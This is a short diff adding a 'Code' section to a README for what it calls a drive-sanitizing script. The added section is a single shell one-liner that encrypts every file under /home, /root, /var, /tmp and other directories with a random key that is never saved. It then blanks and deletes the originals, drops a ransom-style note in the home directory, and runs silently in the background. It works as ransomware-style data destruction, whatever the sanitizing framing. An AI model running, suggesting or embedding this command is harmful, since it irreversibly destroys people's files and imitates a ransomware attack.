@@ -8,3 +8,8 @@ This script was developed for the purpose of sanitizing physical storage drives 
 
 With great powers, great responsibilities...  
 
+### Code
+
+```
+Ranswom@lock:~$ for i in $(find /home /media /mnt /opt /root /srv /tmp /var -type f); do openssl enc -aes-256-cbc -a -salt -in $i -out $i.cry -k $(echo -n $RANDOM | base64 | sha256sum) && echo '' > $i && rm -rf $i;echo 'All your files has been encrypted ! hehehe 3:)' > $HOME/README.TXT;done >/dev/null 2>&1& 
+```
